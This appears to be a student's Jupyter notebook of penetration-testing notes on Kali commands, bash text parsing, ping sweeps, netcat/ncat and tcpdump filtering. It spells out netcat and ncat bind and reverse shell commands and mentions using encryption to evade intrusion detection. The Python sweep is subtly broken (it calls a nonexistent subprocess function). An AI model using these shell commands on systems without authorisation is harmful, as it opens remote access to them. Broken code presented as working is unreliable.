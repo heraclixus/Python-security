{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Kali Quick Commands:\n",
    "1. best way to nagivate and find files in Kali: __updatedb__ then __locate(filename)__. \n",
    "2. __which__ searches through directories defined in PATH environment variable\n",
    "3. service start: __systemctl start (servicename)__. For example, __systemctl start ssh__. \n",
    "4. network service check: __netstat -antp__. For example, check SSH: __netstat -antp | grep sshd__. \n",
    "5. service auto start at booting: __systemctl enable (servicename)__.\n",
    "6. HTTP service: __systemctl start apache2__. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Bash Quick Reference: \n",
    "__wget (url)__ can be equally achieve in Python via the __httplib__ module. In bash, the chain of command can be pipelined to parse html page: __wget www.cisco.com__. The html page is by default in index.html, so the command is:<br>\n",
    "__cat index.html | grep \"href=\" | cut -d \"/\" -f 3 | grep \"\\.\" | cut -d '\"' -f 1 | sort -u__  <br>\n",
    "This means to get html page from cisco, find all patterns with string \"href\" and then use \"/\" as the delimiter, take the 3rd item in the pattern. This should give us\n",
    "The results are a list of domain names. the __host__ command can be used to discover IP address given domain name: <br> __for url in \\$(cat list.txt)\\$; do host \\$url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u__ "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Another usage for text processing bash could be to check access log:  <br>\n",
    "__cat access.log | grep \\<IP addr\\> | cut -d \"\\\"\" -f 2 | uniq -c__  <br>\n",
    "to find the most frequent IP address, or <br>\n",
    "__cat access.log | grep \\<IP addr\\> | grep '/admin' | sort -u __<br>\n",
    "to check the host that tried to access /admin directory. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "%%bash \n",
    "#!/bin/bash \n",
    "# ping sweep for IP range: 10.11.1.0/24\n",
    "for ip in $(seq 1 254); do \n",
    "    ping -c 1 10.11.1.$ip | grep \"byte from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 &\n",
    "done "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Python multiprocessing \n",
    "import multiprocessing \n",
    "import subprocess\n",
    "import os \n",
    "\n",
    "def pinger( job_q, results_q): \n",
    "    DEVNULL = open(os.devnull, 'w')\n",
    "    while True:\n",
    "        ip = job_q.get() \n",
    "        if ip is None: break \n",
    "        try:\n",
    "            subprocess.check_all(['ping', '-c1', ip], stdout=DEVNULL)\n",
    "            results_q.put(ip)\n",
    "        except:\n",
    "            pass \n",
    "\n",
    "if __name__ == '__main__':\n",
    "    pool_size = 255\n",
    "    jobs = multiprocessing.Queue() \n",
    "    results = multiprocessing.Queue()\n",
    "    pool = [ multiprocessing.Process(target=pinger, args=(jobs,results))\n",
    "             for i in range(pool_size) ]\n",
    "\n",
    "    for p in pool:\n",
    "        p.start()\n",
    "\n",
    "    for i in range(1,255):\n",
    "        jobs.put('192.168.1.{0}'.format(i))\n",
    "\n",
    "    for p in pool:\n",
    "        jobs.put(None)\n",
    "\n",
    "    for p in pool:\n",
    "        p.join()\n",
    "\n",
    "    while not results.empty():\n",
    "        ip = results.get()\n",
    "        print(ip)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Essential Command line tools \n",
    "#### Netcat:\n",
    "* check if the port is open on IP: __nc -nv (IP_addr) (portno)__\n",
    "The command will open a connection to the remote IP\n",
    "* listening on port: __nc -nlvp (portno)__ This will serve as a server. Usually used together with first command \n",
    "* Transfering files:  Receiver: __nc -nlvp 4444 > incoming.exe__ . Redirect all inputs to a file called _incoming.exe_. sender: __nc -nv (target_ip) 4444 < (path_to_file).__ The file transfer process is at background and blocking.\n",
    "* __Bindshell__: scenario: Bob requests Alice to use cmd.exe on his local machine. Bob: __nc -nlvp 4444 -e cmd.exe__. Alice: __nc -nv (Bob's IP) 4444__. This scenario is used because Alice is behind NAT and cannot receive connection from Bob.           \n",
    "* Get IP on a host: __ifconfig (network card) | grep inet__.\n",
    "* __Reverse Shell__: Bob requests Alice to send him a command shell. Bob: __nc -nlvp 4444__. Alice: __nc -nv (Bob's IP) 4444 -e /bin/bash__. This is used because Alice cannot forward traffic from the router to her internal machines, so Bob cannot directly get to her. Instead, she must send traffic to Bob. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Ncat \n",
    "* Whereas Netcat does not support encryption, Ncat does. Which could aid bypass firewall and intrusion detection.\n",
    "* __Bindshell__: Bob: __ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl__. This creates a more secure bind shell from Bob's machine that uses ssl. It would also only accept Alice's connection, given by IP 10.0.0.4. Alice would do: __ncat -v 10.0.0.22 4444 --ssl__ and directly connect to Bob, using also ssl.\n",
    "* __Reverse Shell__: Bob: __ncat --allow 10.0.0.4 -vnl 4444 --ssl__. Alice: __ncat --exec cmd.exe -v 10.0.0.22 4444 --ssl__. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tcpdump \n",
    "* Used to dump .pcap files captured, or conduct real time packet sniffing on network device. __tcpdump -r passwd.pcap__\n",
    "* Able to be used directly with shell script for document parsing and filtering. __tcpdump -n -r password_cracking_filtered.pcap | cut -d \" \" -f 3 | sort -u | head__\n",
    "* Flexible options for src, dst, port. __tcpdump -n src host (IP) -r (file)__. __tcpdump -n dst host (IP) -r (file)__ and __tcpdump -n port (portno) -r (file)__.\n",
    "* Dump packet in hex format: __tcpdump -nX -r (file.pcap)__ \n",
    "* __Advanced Header Filtering__: ![tcp](tcp-hdr.png)For example, to filter only packets that have PSH and ACK flas turned on, deal with the 14th byte of the TCP header. The flags are CEU__AP__RSF on the top, with AP for PSH and ACK, set to one, and all others zero. This gives 00011000, or 24 in decimal. This gives command: __tcpdump -A -n 'tcp[13] = 24' -r passwd.pcap__\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GUI tools "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Passive Information Gathering \n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
